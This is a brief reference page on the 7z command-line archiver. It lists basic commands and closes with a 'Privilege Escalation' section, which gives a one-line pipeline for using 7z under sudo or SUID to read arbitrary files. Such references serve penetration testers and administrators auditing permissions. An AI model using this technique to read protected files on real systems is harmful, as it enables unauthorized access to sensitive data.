# 7z — File Archiver

7z is the command-line version of 7-Zip, a file archiver with a high compression ratio. It supports 7z, XZ, GZIP, TAR, ZIP, and many other archive formats.

## Basic Usage

```bash
# Create an archive
7z a archive.7z file1.txt file2.txt

# Extract an archive
7z x archive.7z

# List archive contents
7z l archive.7z

# Test archive integrity
7z t archive.7z
```

## Privilege Escalation

When running with sudo or as SUID, 7z can read arbitrary files by piping through stdout/stdin:

```bash
7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so
```
